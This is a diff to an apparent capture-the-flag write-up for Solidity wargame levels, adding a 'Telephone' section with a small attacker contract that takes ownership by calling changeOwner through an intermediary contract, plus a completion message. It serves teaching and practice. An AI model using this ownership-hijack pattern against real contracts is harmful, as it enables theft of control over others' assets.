@@ -101,7 +101,28 @@ Copy the Coin Flip contract into CoinFlip.sol and deploy win.sol. Call _guess() 
 
 > contract.consecutiveWins()
 
+## 4. Telephone 
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
 
+import "./Telephone.sol";
+
+contract Hack {
+    Telephone public tele;
+
+    constructor(address tele_add) public {
+        tele = Telephone(tele_add);
+    }
+
+    function change_owner(address _owner) public {
+        tele.changeOwner(_owner);
+    }
+}
+
+```
+
+ʕ•̫͡•ʕ*̫͡*ʕ•͓͡•ʔ-̫͡-ʕ•̫͡•ʔ*̫͡*ʔ-̫͡-ʔ Well done, You have completed this level!!!
 
 
 
